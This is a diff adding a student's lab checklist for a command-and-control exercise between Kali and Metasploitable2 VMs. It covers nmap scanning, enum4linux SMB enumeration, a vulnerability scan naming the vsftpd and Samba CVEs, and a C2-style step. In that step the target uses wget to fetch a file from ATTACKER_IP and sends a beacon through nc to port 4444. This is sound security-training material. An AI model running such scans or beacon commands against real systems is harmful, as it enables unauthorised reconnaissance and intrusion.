@@ -1,0 +1,59 @@
+SESSION 9 (C2 LAB) - WHAT REMAINS
+=================================
+The 3-page report C2_lab_MD_Ala_Uddin.docx is written. You need to run
+the lab on your VMs and capture 3 pieces of evidence.
+
+Setup first: 0_Lab_Setup_Guide/MAC_M4_SETUP_STEP_BY_STEP.txt (all parts).
+You need Kali (attacker) and Metasploitable2 (target) both running on
+Host-Only networking.
+
+Find your IPs first:
+  On Metasploitable2:  ifconfig          -> TARGET_IP
+  On Kali:             ip a              -> ATTACKER_IP
+Replace TARGET_IP / ATTACKER_IP below with the real numbers.
+
+------------------------------------------------------------------
+ACTIVITY A - discovery + service scan   (on KALI)
+------------------------------------------------------------------
+  nmap -sn 192.168.64.0/24            # adjust subnet to match your IPs
+  sudo nmap -sS -sV -O -p- TARGET_IP
+  >> SCREENSHOT the terminal showing the command and the open ports.
+  >> Save as:  Screenshots/nmap_MD_Ala_Uddin.png
+
+------------------------------------------------------------------
+ACTIVITY B - C2-style file transfer + beacon
+------------------------------------------------------------------
+  On KALI (attacker):
+    mkdir ~/c2_files
+    echo 'lab test file' > ~/c2_files/sample.txt
+    cd ~/c2_files
+    python3 -m http.server 8000 &
+    nc -lvp 4444
+
+  On METASPLOITABLE2 (target):
+    wget http://ATTACKER_IP:8000/sample.txt -O /tmp/sample.txt
+    cat /tmp/sample.txt
+    echo "ping from target $(hostname)" | nc ATTACKER_IP 4444
+
+  >> SCREENSHOT showing the Kali server+listener AND the target's
+     wget/cat output.
+  >> Save as:  Screenshots/nc_wget_MD_Ala_Uddin.png
+
+------------------------------------------------------------------
+ACTIVITY C - SMB enumeration   (on KALI)
+------------------------------------------------------------------
+  enum4linux -a TARGET_IP
+  >> Copy TWO interesting lines (one share, one user) into a text file.
+  >> Save as:  Screenshots/enum_MD_Ala_Uddin.txt
+
+------------------------------------------------------------------
+ACTIVITY D - vulnerability check   (on KALI)
+------------------------------------------------------------------
+  sudo nmap --script vuln -sV TARGET_IP
+  (Confirms the CVEs listed on page 3 of the report, e.g. vsftpd 2.3.4
+   backdoor CVE-2011-2523 and Samba CVE-2007-2447.)
+
+FINISH
+  Paste nmap_ and nc_wget_ images into the two [INSERT SCREENSHOT]
+  boxes in C2_lab_MD_Ala_Uddin.docx. Keep enum_...txt alongside, or
+  paste its two lines where the report mentions them. Then submit.
